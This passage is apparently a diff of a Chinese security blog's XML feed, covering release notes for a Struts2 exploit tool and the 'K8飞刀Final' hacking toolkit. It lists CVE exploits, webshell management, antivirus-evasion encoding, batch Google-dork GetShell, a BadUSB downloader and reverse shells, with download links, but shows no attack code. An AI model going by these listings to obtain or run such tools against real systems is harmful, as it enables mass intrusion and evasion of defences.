一键添加EXP到Web_Exploit模块数据库功能&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140711<br>[+]Get/Post&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; None模式(只浏览网页不提交任何数据)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140711<br>=================================================================================<br>K8飞刀 20140707<br>[+]Get/Post&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Cookie格式不对,提交闪退的Bug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140707<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 任意文件 转换HEX编码(16进制)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140703<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 任意文件 转换CHR编码(ASC码)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140703<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; UDF提权 MYSQL HEX格式编码转换&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140703<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; UDF提权 MYSQL CHR格式编码转换&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140703<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MOF提权 MYSQL HEX格式编码转换&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140703<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MOF提权 MYSQL CHR格式编码转换&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140703<br>[+]Get/Post&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 伪造 HTTP Referer (请求来源)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140626<br>[+]Get/Post&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; userAgent 自定义编辑&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140608<br>[+]Get/Post&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; userAgent修复(之前版本忘了加了)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140423<br>=================================================================================<br>[+]之前的 回忆过去,痛苦的相思忘不了.</p>]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>Tool</tag>
-        <tag>Exp</tag>
       </tags>
   </entry>
   <entry>
@@ -3921,8 +3905,8 @@ Microsoft Windows 10 for 32-bit Systems 0
       <categories>
         <category>工具</category>
         <category>免杀</category>
-        <category>Metasploit</category>
         <category>Cobalt Strike</category>
+        <category>Metasploit</category>
         <category>ShellCode</category>
       </categories>
       <tags>
@@ -3968,14 +3952,30 @@ Microsoft Windows 10 for 32-bit Systems 0
 <p>
 功能:&nbsp;<br>===========================================================================================<br>[+]新增任意文件上传小马 (解决S2奇葩环境菜刀无法上传文件 &amp; 乱码问题)<br>[+]10 S2-045&nbsp; CVE-2017-5638&nbsp;&nbsp; 支持执行CMD命令<br>[+]9 devMode CVE-xxxx-xxxx&nbsp;&nbsp; 支持GetShell/获取物理路径/执行CMD命令<br>[+]8 S2-037&nbsp; CVE-2016-4438&nbsp;&nbsp; 支持GetShell/获取物理路径/执行CMD命令<br>[+]7 S2-032&nbsp; CVE-2016-3081&nbsp;&nbsp; 支持GetShell/获取物理路径/执行CMD命令<br>[+]6 S2-020&nbsp; CVE-2014-0094&nbsp;&nbsp; 支持GetShell (此洞特殊,EXP集成在飞刀)<br>[+]5 S2-019&nbsp; CVE-2013-4316&nbsp;&nbsp; 支持GetShell/获取物理路径/执行CMD命令<br>[+]4 S2-016&nbsp; CVE-2013-2251&nbsp;&nbsp; 支持GetShell/获取物理路径/执行CMD命令<br>[+]3 S2-013&nbsp; CVE-2013-1966&nbsp;&nbsp; 支持GetShell/获取物理路径/执行CMD命令<br>[+]2 S2-009&nbsp; CVE-2011-3923&nbsp;&nbsp; 支持GetShell/获取物理路径/执行CMD命令<br>[+]1 S2-005&nbsp; CVE-2010-1870&nbsp;&nbsp; 支持GetShell/获取物理路径/执行CMD命令/列文件目录<br>===========================================================================================<br>CVE-2016-4438&nbsp; 影响版本：Struts 2.3.20 - Struts 2.3.28.1&nbsp; 官方公告：http://struts.apache.org/docs/s2-037.html<br>CVE-2016-3081&nbsp; 影响版本：Struts 2.3.18 &ndash; Struts 2.3.28&nbsp;&nbsp; 官方公告：http://struts.apache.org/release/2.3.x/docs/s2-032.html<br>CVE-2014-0094&nbsp; 影响版本：Struts 2.0.0 &ndash; Struts 2.3.16&nbsp;&nbsp;&nbsp; 官方公告：http://struts.apache.org/release/2.3.x/docs/s2-020.html<br>CVE-2013-4316&nbsp; 影响版本：Struts 2.0.0 &ndash; Struts 2.3.15.1&nbsp; 官方公告：http://struts.apache.org/release/2.3.x/docs/s2-019.html<br>CVE-2013-2251&nbsp; 影响版本：Struts 2.0.0 &ndash; Struts 2.3.15&nbsp;&nbsp;&nbsp; 官方公告：http://struts.apache.org/release/2.3.x/docs/s2-016.html<br>CVE-2013-1966&nbsp; 影响版本：Struts 2.0.0 &ndash; Struts 2.3.14&nbsp;&nbsp;&nbsp; 官方公告：http://struts.apache.org/release/2.3.x/docs/s2-013.html<br>CVE-2011-3923&nbsp; 影响版本：Struts 2.0.0 -&nbsp; Struts 2.3.1.1&nbsp;&nbsp; 官方公告：http://struts.apache.org/release/2.3.x/docs/s2-009.html<br>CVE-2010-1870&nbsp; 影响版本：Struts 2.0.0 &ndash; Struts 2.1.8.1&nbsp;&nbsp; 官方公告：http://struts.apache.org/release/2.2.x/docs/s2-005.html<br>===========================================================================================<br><br><span style="color: #ff00ff;">下载地址:</span><br>文件: K8_Struts2_EXP.exe<br>SHA1:3DAF7AD4FB7440C33E66613E6075A0F02EA9DF18<br>平台:&nbsp;XP/Vista/Win7/Win8/2000/2003/2008/2012<br>猛击:<a href="http://pan.baidu.com/s/1cpcQeE" rel="nofollow" target="_blank">http://pan.baidu.com/s/1cpcQeE</a><br><br><a id="cb_post_title_url" class="postTitle2" href="https://www.cnblogs.com/k8gege/p/10261217.html" target="_blank" rel="noopener">[原创]Struts2奇葩环境任意文件上传工具(解决菜刀无法传文件或上传乱码等问题)</a><br>https://www.cnblogs.com/k8gege/p/10261217.html</p>]]></content>
       <categories>
-        <category>Exp</category>
         <category>工具</category>
+        <category>Exp</category>
       </categories>
       <tags>
         <tag>Tool</tag>
         <tag>Exp</tag>
         <tag>Struts2</tag>
         <tag>GetShell</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>K8飞刀Final</title>
+    <url>/p/de1a82bb.html</url>
+    <content><![CDATA[<p><img alt data-original="http://k8gege.org/k8img/k8fly/k8fly.png"></p>
+<p><strong>法律声明:</strong> 工具仅供安全研究或授权渗透，非法用途后果自负。<br><br><strong>工具:</strong> K8飞刀Final<br><strong>作者:</strong> K8哥哥<br><strong>博客:</strong> https://www.cnblogs.com/k8gege<br><strong>简介:</strong> 一款多功能网络安全渗透测试工具(Hacker Swiss Army Knife)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1.漏洞利用：&nbsp;&nbsp; 已集成20个主流WEB、CMS程序,累计115个EXP（如Drupal、Joomla、Wordpress、Vbulletin、Xampp、Zimbra、ThinkPHP、Magento、Discuz）<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2.后台扫描：&nbsp;&nbsp; 后台管理、登陆地址、木马地址、数据等<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 3.域名扫描：&nbsp;&nbsp; 子域名扫描、二级域名扫描、WP用户扫描<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4.黑客浏览器： 自动检测SQL注入、比FireFox扩展HackBar更强更全的HTTP参数提交(见EXP调式)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 5.EXP 调式：&nbsp;&nbsp; 支持Get/Post/Cookie/UserAgent/Referer/X-Forwarded-For/Client-IP/VIA提交&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 6.生成 EXP：&nbsp;&nbsp; 可将调式好的EXP生成工具，无需编程功底即可实现EXP或直接加入飞刀漏洞利用库<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 7.加密算法：&nbsp;&nbsp; MD5(16)、MD5(32)、SHA1、SHA256、SHA384、SHA512&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 8.加密解密：&nbsp;&nbsp; Base32、Base64、Base64(SHA1)支持批量加密解密、DeDe密码、VNC密码、进制转换<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 9.编码转换：&nbsp;&nbsp; Hex(16进制)、URL编码、ASCII码、ASCII码转其它、Unicode转ANSI、ANSI转Unicode&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.文件转换：&nbsp; Hex2File、Hex2Bin、Bin2Hex、File2Hex（可读取任意文件比如EXE或Shellcode）<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 11.SQL编码：&nbsp;&nbsp; SQL注入专用CHAR以及HEX路径转换(MSSQL、Mysql、Oracle等数据库)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 12.XSS编码：&nbsp;&nbsp; JS_HEX、JS_Unicode、JS_Escape、FromCharCode、HTML实体加密解密<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 13.Shell管理： 支持7种WebShell(ASP/PHP/JSP/ASPX/CFM/PYTHON/PERL)，多协议连接(仅CMD)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 14.CookieHK：&nbsp; 读取当前登陆站点Cookie(支持httponly)、可使用Cookie直接登陆后台<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 15.WebShell：&nbsp; 内置飞刀专用一句话(UA或其它格式一句话可过大量杀软及WAF防火墙)&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 16.Hacking：&nbsp;&nbsp; VBS随机加密免杀、GetShell、0day网马、硬件BadUSB(Teensy下载者)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 17.脱库工具：&nbsp; 注入点脱库工具、支持自定义关键字或正则提取数据、可采集URL<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 18.GoogleHK：&nbsp; 批量抓取URL、批量检测注入、批量GetShell、批量执行自定义EXP<br><br><strong>最终版</strong>：由于加密硬盘损坏部分飞刀等工具源码无法恢复,2017年底已无法更新飞刀主程序,但很多功能长期可用,漏洞利用库可加EXP<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 朋友们不用再问我要最新版了,没发现我已经差不2两年没更新了，和2012年的一个工具一样,不是我不更新,而是无法更新了<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 加密的源码损坏某个地方，就会导致整个文件无法解密，何况经过两层加密（一层硬盘加密，一层源码加密，源码外还有TC）</p>
+<p><strong>下载地址：</strong><a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/raw/master/K8%E9%A3%9E%E5%88%80Final.rar</a></p>
+<p><strong>思维导图:</strong>&nbsp; <a href="https://raw.githubusercontent.com/k8gege/K8tools/master/K8%E9%A3%9E%E5%88%80Final.png" target="_blank">https://raw.githubusercontent.com/k8gege/K8tools/master/K8%E9%A3%9E%E5%88%80Final.png</a></p>
+<p><strong>更新历史</strong><br>=================================================================================<br>K8飞刀 20170920<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--VNC密码加密解密（RealVNC、Tightvnc等)&nbsp;&nbsp;&nbsp;&nbsp; 20170920<br>[+]CmdShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ASPX UA CmdShell(下载文件到服务器命令)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20170426<br>[+]CmdShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ASPX UA CmdShell(UA Aspx一句话CMD连接)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20170422<br>[+]CmdShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ASP&nbsp; UA CmdShell(UA Asp一句话CMD连接)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20170422<br>[+]CmdShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 历史执行命令(文本下拉框&amp;上下方向键控制)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20170422<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--Base64(SHA1)批量加密解密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20170120<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--Base32--批量加密解密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20170120<br>K8飞刀 20160613<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--XSS跨站--HTML实体编码(Hex)解密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160612<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--XSS跨站--HTML实体编码(Dec)解密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160612<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--Hex编码--Hex2PleskHex(Plesk密码)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160610<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--Hex编码--Hex2RegHex(注册表Hex)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160610<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--Hex编码--RegHex2Hex(注册表Hex)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160610<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--Hex编码--Hex2File(Hex转Bin文件)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160610<br>=================================================================================<br>K8飞刀 20160514<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--GetShell--ImageMagick命令执行EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160514<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--数据处理--计算机存储单位换算&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160505<br>=================================================================================<br>K8飞刀 20160414<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 漏洞利用库EXP 支持(VIA/X_FORWARDED_FOR/Client-IP)&nbsp;&nbsp; 20160413<br>[+]HackerIE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 生成EXE漏洞EXP支持(VIA/X_FORWARDED_FOR/Client-IP)&nbsp;&nbsp; 20160412<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--File/文件--Hex2Bin(Hex转文件含空格)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160412<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--File/文件--Hex2File(Hex转文件非空格)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160412<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ColdFusion JRun LFI EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160412<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ColdFusion 7b LFI EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160412<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ColdFusion 7a LFI EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160412<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ColdFusion 6 LFI EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160412<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ColdFusion 8 LFI EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160412<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 右键查看EXP漏洞库列表&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160412<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--浏览器--URL右键另存为&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160304<br>=================================================================================<br>K8飞刀 20160302<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--Base64编码--Base64批量解密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160302<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--数据处理--MSSQL连接字符串用户密码字典&nbsp;&nbsp;&nbsp;&nbsp; 20160301<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--数据处理--MSSQL连接字符串用户密码提取&nbsp;&nbsp;&nbsp;&nbsp; 20160301<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--字符串处理--正则忽略大小写字符串生成&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160301<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--数据处理--MSSQL连接字符串(Web.config)&nbsp;&nbsp;&nbsp;&nbsp; 20160229<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--WebShell--菜刀配置数据库代码生成&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160626<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Code/代码--C#属性代码生成&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160223<br>[+]HackerIE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; UserAgent--WebShell一句话测试(ASPX/PHP/ASP)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160203<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--字符串处理--拼接\倒序\拼接注释免杀&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160202<br>=================================================================================<br>K8飞刀 20160115<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--代码纠正--处理从网页复制的ASPX代码&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160115<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--代码转CMD写入文件(命令行-可执行命令)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160108<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--代码转BAT写入文件(批处理-可上传文件)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160108<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--File/文件--File2Hex文件转16进制(空格)&nbsp;&nbsp;&nbsp;&nbsp; 20160108<br>=================================================================================<br>K8飞刀 20151218<br>[+]GoogleHacker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Google黑客--Hacking--批量执行Joomla GetShell EXP&nbsp;&nbsp;&nbsp; 20151216<br>[+]GoogleHacker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Google黑客--Hacking--批量执行Jboss&nbsp; GetShell EXP&nbsp;&nbsp;&nbsp; 20151216<br>[+]GoogleHacker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Google黑客--Hacking--批量执行Sqlmap 检测注入点&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20151216<br>[u]AutoUpdate&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 自动更新显示详细更新内容(让用户了解最新版功能)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20151215<br>[+]GoogleHacker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Google黑客搜索模块--Hacking--批量执行自定义EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20151208<br>[u]ScanAdmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 大型站点子域名扫描/大型站点子域名收集结果更准确&nbsp;&nbsp;&nbsp;&nbsp; 20151203<br>[+]CmdShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Windows &amp; Linux渗透常用命令 &amp; NC反弹一键编译&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20151126<br>=================================================================================<br>K8飞刀 20151120<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--WebShell--PHP木马--UA一句话木马&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20151118<br>[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Shell文件管理--右键菜单--保存目录结构信息&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20151118<br>[+]HackerIE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hack模式 调用SQLMAP检测页面URL是否存在注入&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20151015<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XAMPP &lt;=1.6.8&nbsp; 1.7.1 1.8.2 SQL注入漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20151015<br>=================================================================================<br>K8飞刀 2015国庆版<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--0day漏洞--Word远程代码执行MS15-022&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150929<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--0day漏洞--WinRAR自解压远程代码执行&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 